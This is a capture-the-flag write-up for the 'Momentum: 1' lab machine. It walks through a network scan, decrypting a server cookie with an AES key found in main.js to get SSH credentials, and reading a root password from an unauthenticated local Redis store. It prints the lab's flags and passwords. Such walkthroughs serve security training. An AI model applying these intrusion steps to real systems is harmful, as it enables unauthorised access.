# Momentum: 1 Writeup
# Description
```bash
Info: easy / medium
```
# Exploitation
Let's start with a network scan
```bash
Currently scanning: 192.168.0.111/24   |   Screen View: Unique Hosts                                                                                                                                             
                                                                                                                                                                                                                  
 9 Captured ARP Req/Rep packets, from 5 hosts.   Total size: 540                                                                                                                                                  
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.0.1     f0:a7:31:e9:bb:f8      5     300  TP-Link Systems Inc                                                                                                                                            
 192.168.0.104   40:65:d4:5e:e0:3e      1      60  Unknown vendor                                                                                                                                                 
 192.168.0.115   08:00:27:e3:ad:bf      1      60  PCS Systemtechnik GmbH                                                                                                                                         
 192.168.0.102   d8:80:83:cf:7a:77      1      60  CLOUD NETWORK TECHNOLOGY SINGAPORE PTE. LTD.
```
\
Next, Open ports
```bash
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
```
\
Accessing port 80 on browser
\
<img width="1587" height="592" alt="image" src="https://github.com/user-attachments/assets/85259224-4b69-4312-aaee-6bd4d77c3a42" />
\
After checking a bit , we discover main.js here
\
<img width="651" height="257" alt="image" src="https://github.com/user-attachments/assets/18d4d813-147a-4c99-911b-980a94b95ac2" />
\
Then i realized we had a cookie set by the server and the only 2 things we had were the cookie and an aes decryption method , so i tried decrypting the key
\
<img width="770" height="391" alt="image" src="https://github.com/user-attachments/assets/a7051866-5788-4175-ad8b-510b18acc8d2" />
\
Finally on some online node js compiler i got it to execute 
```bash
"auxerre-alienum##"
```
\
Then i tried ssh as root , but didnt work , so i tried auxerre as the user and the total string as the password and we got a shell
```bash
ssh auxerre@192.168.0.115 
auxerre@192.168.0.115's password: 
Linux Momentum 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Apr 22 08:47:31 2021
auxerre@Momentum:~$ id
uid=1000(auxerre) gid=1000(auxerre) groups=1000(auxerre),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
auxerre@Momentum:~$ cat user.txt 
[ Momentum - User Owned ]
---------------------------------------
flag : 84157165c30ad34d18945b647ec7f647
---------------------------------------
```
\
Then after some time i checked what ports were open
```bash
auxerre@Momentum:/tmp$ ss -tunlp
Netid   State    Recv-Q   Send-Q     Local Address:Port     Peer Address:Port   
udp     UNCONN   0        0                0.0.0.0:68            0.0.0.0:*      
tcp     LISTEN   0        128              0.0.0.0:22            0.0.0.0:*      
tcp     LISTEN   0        128            127.0.0.1:6379          0.0.0.0:*      
tcp     LISTEN   0        128                 [::]:22               [::]:*      
tcp     LISTEN   0        128                [::1]:6379             [::]:*      
tcp     LISTEN   0        128                    *:80                  *:*
```
\
I searched online what service usually runs on that port , and turneed out it was "Redis", so i check how to connect to it and enumerate
```bash
redis-cli
127.0.0.1:6379> KEYS *
1) "rootpass"
127.0.0.1:6379> GET rootpass
"m0mentum-al1enum##"
127.0.0.1:6379> exit
```
\
WE see that the keys had a "rootpass" , which we just get and find password of root
```bash
root@Momentum:~# cat root.txt 
[ Momentum - Rooted ]
---------------------------------------
Flag : 658ff660fdac0b079ea78238e5996e40
---------------------------------------
by alienum with <3
```
\
The End , thank you for reading till here
